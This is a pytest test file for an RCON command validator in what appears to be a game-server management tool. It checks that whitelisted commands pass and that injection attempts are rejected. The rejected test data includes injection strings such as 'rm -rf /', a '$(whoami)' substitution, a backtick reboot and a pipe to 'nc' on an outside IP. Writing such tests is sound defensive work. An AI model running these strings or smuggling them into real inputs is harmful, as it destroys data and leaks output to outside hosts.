import pytest
from patchraptor.rcon_manager import RCONManager
from patchraptor.exceptions import RCONValidationError

@pytest.fixture
def rcon_manager():
    return RCONManager(rcon_tool="rcon.exe")

def test_validate_safe_commands(rcon_manager):
    """Test that safe commands are allowed"""
    safe_commands = [
        "SaveWorld",
        "ShowPlayers",
        "DoExit",
        "GetGameLog",
        "ServerChat Hello World",
        "KickPlayer BadGuy",
        "BanPlayer Cheater",
        "UnbanPlayer Innocent",
        "ListPlayers"
    ]
    for cmd in safe_commands:
        try:
            rcon_manager._validate_rcon_command(cmd)
        except RCONValidationError:
            pytest.fail(f"Safe command '{cmd}' was rejected")

def test_validate_dangerous_commands(rcon_manager):
    """Test that dangerous commands are rejected (Injection attempts)"""
    dangerous_commands = [
        "SaveWorld; rm -rf /",
        "DoExit & echo 'hacked'",
        "ServerChat $(whoami)",
        "ShowPlayers | nc 1.2.3.4 80",
        "SaveWorld`reboot`",
        "GetGameLog > output.txt",
        "admincheats",  # Not in whitelist
        "settimeofday 12:00" # Not in whitelist
    ]
    for cmd in dangerous_commands:
        with pytest.raises(RCONValidationError, match="Command .*"):
            rcon_manager._validate_rcon_command(cmd)

def test_create_command_args(rcon_manager):
    """Test accurate argument construction"""
    args = rcon_manager.create_command_args(
        ip="127.0.0.1", port=27020, password="pass", cmd="SaveWorld"
    )
    expected = ["rcon.exe", "ip=127.0.0.1", "port=27020", "pwd=pass", "cmd=SaveWorld"]
    assert args == expected
